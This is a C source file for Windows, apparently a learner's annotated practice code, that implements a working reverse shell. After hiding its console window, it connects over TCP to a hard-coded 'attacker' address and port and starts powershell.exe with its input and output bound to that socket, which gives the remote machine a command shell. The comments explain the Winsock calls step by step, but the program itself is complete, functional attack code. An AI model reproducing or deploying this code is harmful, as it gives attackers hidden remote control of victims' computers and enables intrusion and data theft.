#include <winsock2.h>
#include <windows.h> // Import for the Windows API 
#include <stdio.h> // Standard input / output functions
#include <string.h>

// "Link" (define linking) to the ws2_32 library
/*
Linking (what i understood) :
-> Linking is the process of connecting libraries to your code to add additional functions / functionnality
-> You link a Library to your code using directives like :
|---> #pragma comment(lib, "library-name.lib")
*/

// To use sockets in windows you have to initialize Winsock

#pragma comment(lib, "ws2_32.lib")





int main() {
    // hide window
    HWND console;
    AllocConsole();
    console = FindWindowA("consoleWindowClass", NULL);
    ShowWindow(console, SW_HIDE);


    printf("Reverse Shell attempt #1");
    WSADATA socketdata; // Unsure : This stores info about the socket but is empty until we use WSAStartup()

    WSAStartup(MAKEWORD(2,2), &socketdata);
    /*
    WSAStartup() -> Call to initialize the WinSock system (kinda like turning on power before using power tool)
    MAKEWORD(2,2) -> Asks for version 2.2 of WinSock
    &socketdata -> "pointer" (define pointer TODO) to the previously created variable to store the socket data in it    
    */

    // Now we can start to create an actual socket, For this we can use the "WSASocketA()" function
    SOCKET socketN1 = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    /*
    First we put the function in a variable (socketN1) because :
    -> The function (WSASocketA) returns a value
    -> It allows for error checking depending on the value
    -> And since it's in a variable we can check for it in a "if" statement later

    WSASocketA(
    AF_INET, -> "Address Family INET" specifies that the socket will use the IPv4 address family, AF_INET6 for IPv6
    SOCK_STREAM, -> Indicates that the socket is a stream socket (connexion data transfer, little bit like TCP)
    IPPROTO_TCP, -> Specifies to use the TCP protocol
    NULL, -> By passing NULL, you are instructing Winsock to use the first available transport provider that supports the requested combination of address family (AF_INET), socket type (SOCK_STREAM), and protocol (IPPROTO_TCP).
    NULL, -> Passing NULL indicates that the socket will not belong to an existing socket group, nor will a new group be created
    NULL, -> Passing NULL indicates that you want to use a non-overlapped socket
    );
    
    */
    // Basic error check :
    if (socketN1 == INVALID_SOCKET) {
        printf("[!] - Something Went wrong during socket creation: %d\n",WSAGetLastError());
    }
    // Initialize the structure 
    struct sockaddr_in connectionaddress;
    char* attacker_IP = "192.168.1.59";
    short attacker_PORT = 17293;

    connectionaddress.sin_family = AF_INET; // Indicate that we are using IPv4
    connectionaddress.sin_addr.s_addr = inet_addr(attacker_IP); // Convert and store the attacker’s IP address (in network byte order) in the struct
    connectionaddress.sin_port = htons(attacker_PORT); // Convert the port to network byte order and store it in the struct
    // Connect to the attacker's machine
    if (connect(socketN1, (struct sockaddr*)&connectionaddress, sizeof(connectionaddress)) == SOCKET_ERROR) {
        printf("[!] - Connection failed: %d\n", WSAGetLastError());
        closesocket(socketN1);
        WSACleanup();
        return 1;
    }
    STARTUPINFOA startupInformation;
    HANDLE Sockethandle = (HANDLE)socketN1;

    memset(&startupInformation, 0, sizeof(startupInformation));
    startupInformation.cb = sizeof(startupInformation);
    startupInformation.dwFlags = STARTF_USESTDHANDLES;
    startupInformation.hStdError = startupInformation.hStdInput = startupInformation.hStdOutput = Sockethandle;

    PROCESS_INFORMATION processInformation;

    // Create the process (powershell.exe)
    if (CreateProcessA(NULL, "powershell.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInformation, &processInformation)) {
        printf("Process created successfully. PID: %d\n", processInformation.dwProcessId);
    } else {
        printf("Error creating process: %d\n", GetLastError());
    }
    

    return 0;
}
